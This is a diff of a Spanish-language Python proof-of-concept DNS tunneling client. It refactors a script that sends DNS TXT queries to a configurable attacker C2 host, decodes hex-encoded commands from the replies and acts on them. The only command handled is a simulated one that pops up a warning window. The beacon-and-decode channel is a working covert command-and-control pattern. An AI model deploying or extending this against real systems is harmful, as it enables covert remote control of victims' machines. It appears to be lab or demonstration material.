@@ -1,11 +1,24 @@
-# dns_victim_client.py (Ejecutar en la Máquina Virtual: 192.168.1.19)
-from scapy.all import IP, UDP, DNS, DNSQR, sr1
+import socket
+import argparse
+import logging
 import tkinter as tk
 from tkinter import messagebox
+from scapy.all import DNS, DNSQR
 
-# Configuración con la IP de tu PC principal
-IP_ATACANTE = "192.168.1.14" 
-DOMINIO_BEACON = "beacon.falso.local"
+logging.basicConfig(
+    level=logging.INFO, 
+    format='[%(asctime)s] [%(levelname)s] %(message)s', 
+    datefmt='%Y-%m-%d %H:%M:%S'
+)
+
+BANNER = """
+ ____  _   _ ____    _   _ _      _   _           
+|  _ \\| \\ | / ___|  | | | (_) ___| |_(_)_ __ ___  
+| | | |  \\| \\___ \\  | | | | |/ __| __| | '_ ` _ \\ 
+| |_| | |\\  |___) | | |_| | | (__| |_| | | | | | |
+|____/|_| \\_|____/   \\___/|_|\\___|\\__|_|_| |_| |_|
+       -- DNS Tunneling PoC Client --
+"""
 
 def mostrar_alerta_visual(mensaje):
     root = tk.Tk()
@@ -13,33 +26,46 @@ def mostrar_alerta_visual(mensaje):
     messagebox.showwarning("¡Alerta Crítica de Seguridad!", mensaje)
     root.destroy()
 
-def llamar_al_c2():
-    print(f"[*] Solicitando instrucciones a C2 ({IP_ATACANTE}) vía DNS...")
+def llamar_al_c2(ip_atacante, puerto, dominio):
+    print(BANNER)
+    logging.info(f"Iniciando beaconing hacia C2 ({ip_atacante}:{puerto}) vía DNS nativo...")
     
-    # Petición DNS explícita tipo TXT apuntando a la IP de tu PC
-    paquete_dns = IP(dst=IP_ATACANTE)/UDP(dport=9000)/DNS(rd=1, qd=DNSQR(qname=DOMINIO_BEACON, qtype="TXT"))
+    peticion_dns = DNS(rd=1, qd=DNSQR(qname=dominio, qtype="TXT"))
+    datos_crudos = bytes(peticion_dns)
     
-    respuesta = sr1(paquete_dns, timeout=5, verbose=0)
-    
-    if respuesta and respuesta.haslayer(DNS) and respuesta[DNS].ancount > 0:
-        rdata = respuesta[DNS].an.rdata
-        if isinstance(rdata, list):
-            rdata = rdata[0]
-            
-        try:
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(5)
+        sock.sendto(datos_crudos, (ip_atacante, puerto))
+        
+        datos_respuesta, _ = sock.recvfrom(1024)
+        respuesta = DNS(datos_respuesta)
+        
+        if respuesta.ancount > 0:
+            rdata = respuesta.an.rdata
+            if isinstance(rdata, list):
+                rdata = rdata[0]
+                
             payload_hex = rdata.decode('utf-8')
             comando = bytes.fromhex(payload_hex).decode('utf-8')
-            print(f"[+] Respuesta recibida y decodificada: {comando}")
+            logging.info(f"Respuesta recibida y decodificada exitosamente: {comando}")
             
             if comando.startswith("CMD_SIM:Show-Alert:"):
                 mensaje_alerta = comando.split(":", 2)[2].replace("_", " ")
-                print(f"[!] Ejecutando orden visual...")
+                logging.warning(f"Ejecutando orden visual del C2...")
                 mostrar_alerta_visual(mensaje_alerta)
                 
-        except Exception as e:
-            print(f"[-] Error al procesar datos: {e}")
-    else:
-        print("[-] Sin respuesta del servidor C2. ¿Está corriendo el script en el atacante?")
+    except socket.timeout:
+        logging.error("Sin respuesta del servidor C2. Tiempo de espera agotado.")
+    except Exception as e:
+        logging.error(f"Error de conexión: {e}")
 
 if __name__ == "__main__":
-    llamar_al_c2()
+    # La IP ya no está dentro del código, se pasa como parámetro obligatorio (-t)
+    parser = argparse.ArgumentParser(description="DNS Tunneling Stager PoC")
+    parser.add_argument("-t", "--target", required=True, help="IP del servidor C2 Atacante")
+    parser.add_argument("-p", "--port", type=int, default=9000, help="Puerto UDP del servidor (default: 9000)")
+    parser.add_argument("-d", "--domain", default="beacon.falso.local", help="Dominio de beaconing (default: beacon.falso.local)")
+    
+    args = parser.parse_args()
+    llamar_al_c2(args.target, args.port, args.domain)
